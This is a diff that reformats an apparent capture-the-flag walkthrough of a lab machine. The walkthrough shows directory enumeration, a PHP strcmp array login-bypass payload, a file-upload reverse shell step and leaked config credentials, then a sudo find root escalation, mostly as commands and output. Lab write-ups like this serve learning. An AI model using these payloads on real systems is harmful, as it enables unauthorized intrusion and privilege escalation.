@@ -1,3 +1,4 @@
+```bash
 ┌──(sabeshan㉿kali)-[~]
 └─$ dirsearch -u http://10.129.243.139/
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
@@ -39,8 +40,10 @@ Target: http://10.129.243.139/
 [18:20:27] 403 -  279B  - /server-status/                                   
 [18:20:28] 403 -  279B  - /server-status                                    
 [18:20:53] 302 -    0B  - /upload.php  ->  /login/login.php
+```
 --------------------------------------------------------------------------
-1.                                                                                                                                                                                                                
+1.
+```bash                                                                                                                                                                                                            
 ┌──(sabeshan㉿kali)-[~/Downloads]
 └─$ strings login.php.swp
 b0VIM 8.0
@@ -124,8 +127,11 @@ session_start();
 </html>
 </body>
   <script src="../assets/js/main.js"></script>
+```
 -------------------------------------------------------------------------------------------
-2.if (strcmp($password, $_POST['password']) == 0) {
+2.
+```bash
+if (strcmp($password, $_POST['password']) == 0) {
     if (strcmp($username, $_POST['username']) == 0) { From these lines looks different we can try the password.
 POST /login/login.php HTTP/1.1
 
@@ -156,8 +162,10 @@ Cookie: PHPSESSID=pmivi2chdfnkstl8uphun3ctbt
 Connection: keep-alive
 
 username[]=admin&password[]=pass
+```
 This thing is bypass the login. and login to the admin pannel.
 -------------------------------------------------------------------------------------
+```bash
 gobuster dir -u http://10.129.243.139/ -w /usr/share/wordlists/dirb/big.txt -t 100                                                
 ===============================================================
 Gobuster v3.6
@@ -179,9 +187,10 @@ Starting gobuster in directory enumeration mode
 /assets               (Status: 301) [Size: 317] [--> http://10.129.243.139/assets/]
 /forms                (Status: 301) [Size: 316] [--> http://10.129.243.139/forms/]
 /login                (Status: 301) [Size: 316] [--> http://10.129.243.139/login/]
-
+```
 -------------------------------------------------------------------------------------------------------------
 3.After the admin panel i got the vulnerability called file uploaded and upload the reverse shell file and get the initial web shell access.
+```bash
 www-data@base:/var/www/html$ cd assets/
 www-data@base:/var/www/html/assets$ ls -la
 total 28
@@ -204,9 +213,11 @@ drwxr-xr-x 6 root root  4096 Jun  9  2022 ..
 www-data@base:/var/www/html/login$ cat config.php
 <?php
 $username = "admin";
-$password = "thisisagoodpassword";www-data@base:/var/www/html/login$ 
+$password = "thisisagoodpassword";www-data@base:/var/www/html/login$
+```
 ------------------------------------------------------------------------------------------------------------------------
 4.I got the users on the system 
+```bash
 ┌──(sabeshan㉿kali)-[~/Downloads]
 └─$ ssh john@10.129.243.139           
 The authenticity of host '10.129.243.139 (10.129.243.139)' can't be established.
@@ -244,10 +255,12 @@ Matching Defaults entries for john on base:
 
 User john may run the following commands on base:
     (root : root) /usr/bin/find
-john@base:~$ 
+john@base:~$
+```
 there is privilege to access the root in the find binary we can execute it.
 for this escaltion we can use the GTFObin.
 -----------------------------------------------------------------------------------------------------------------------
+```bash
 john@base:~$ sudo -l
 [sudo] password for john: 
 Matching Defaults entries for john on base:
@@ -262,3 +275,4 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 # 
 Finally i got rooted the machines.
+```
